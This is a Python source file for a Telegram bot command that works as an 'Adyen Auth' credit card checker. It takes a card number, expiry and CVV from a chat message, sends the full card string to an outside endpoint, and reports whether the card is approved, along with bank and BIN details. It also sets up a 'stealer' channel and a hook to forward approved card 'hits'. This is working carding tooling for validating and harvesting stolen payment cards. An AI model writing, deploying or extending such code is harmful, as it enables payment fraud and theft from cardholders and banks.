import httpx
import time
import asyncio
import re
from pyrogram import Client, filters

# --- REAL UTILITY FUNCTIONS ---

async def check_all_thing(Client, message): 
    # This should normally check user status/credits in your database
    return [True, "user"]

async def getmessage(message):
    """
    Extracts CC details from the message text.
    Returns [cc, month, year, cvc] if found, otherwise False.
    """
    text = message.text
    if not text:
        return False
        
    # Remove the command part (e.g., /ad or .ad)
    input_text = text.split(None, 1)
    if len(input_text) < 2:
        return False
    
    # Use regex to find 15-16 digits for CC, and then 2 digits for month/year and 3-4 for CVV
    cards = re.findall(r'\d+', input_text[1])
    
    if len(cards) < 4:
        return False
        
    cc = cards[0]
    mes = cards[1]
    ano = cards[2]
    cvv = cards[3]
    
    # Basic validation to ensure it looks like a card
    if len(cc) < 15:
        return False
        
    return [cc, mes, ano, cvv]

async def get_bin_details(cc):
    # This would normally be an external API call to look up BIN info
    return ["VISA", "DEBIT", "PLATINUM", "BANK OF AMERICA", "US", "🇺🇸", "USD"]

async def setantispamtime(user_id): pass
async def deductcredit(user_id): pass
async def sendcc(finalresp, session): pass
async def error_log(exc): print(f"Error: {exc}")

# --- BOT LOGIC ---

# Replace with your actual channel ID if needed
STEALER_CHANNEL_ID = -1002549777556

async def send_hit_if_approved(client: Client, text: str):
    try:
        # await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
        print(f"[Stealer] Sending hit: {text}")
    except Exception as e:
        print(f"[Stealer Error] Failed to forward: {e}")

@Client.on_message(filters.command("ad", [".", "/"]))
async def adyen_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)

        gateway = "Adyen Auth 💳"

        if checkall[0] == False:
            return

        role = checkall[1]
        
        # This correctly reads the CC you type
        getcc = await getmessage(message)
        
        if getcc == False:
            # If no CC was typed, show the help prompt
            resp = f"""〈<a href='tg://user?id={user_id}'>꫟</a>〉-» Adyen Auth - CHECK\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway} \n\n<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /ad cc|month|year|cvc"""
            await message.reply_text(resp, quote=True)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        
        # Endpoint URL with the REAL CC you typed
        endpoint_url = f"https://onyxenvbot.up.railway.app/adyen/key=yashikaaa/cc={fullcc}"

        # REMOVED: All "Checking..." animations and progress messages.
        # The bot will now immediately perform the check and then send the final result.

        start = time.perf_counter()
        session = httpx.AsyncClient(timeout=30, follow_redirects=True)
        
        try:
            response_obj = await session.get(endpoint_url)
            result_json = response_obj.json()
            status = result_json.get("status", "Unknown")
            response = result_json.get("response", "No response message")
        except httpx.RequestError as e:
            status = "Error"
            response = f"Request failed: {e}"
        except ValueError:
            status = "Error"
            response = "Invalid JSON response"

        getbin = await get_bin_details(cc)

        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
        
        end = time.perf_counter()
        elapsed_time = round(end - start, 2)

        # Final result text
        finalresp = f"""\n[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>\n[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}\n[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}\n\n━━━〔 INFO 〕━━━\n[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}\n[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}\n[〄] 𝘾𝙊𝙐𝙉𝙏𝗥𝗬⟶ {country} {flag}\n\n━━━〔 META 〕━━━\n[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ {gateway}\n[〄] 𝙏𝙄𝙈𝙀 ⟶  {elapsed_time:0.2f}s\n[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 𝙏𝙄𝙈𝙀 ⟶<a href=\'tg://user?id={user_id}\'> User</a> {role} \n\n━━━〔 OWNER 〕━━━\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>\n"""

        # Immediately send the final result to Telegram
        await message.reply_text(finalresp, quote=True)

        await setantispamtime(user_id)
        await deductcredit(user_id)

        if status == "Approved ✅":
            await sendcc(finalresp, session)

        await session.aclose()

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
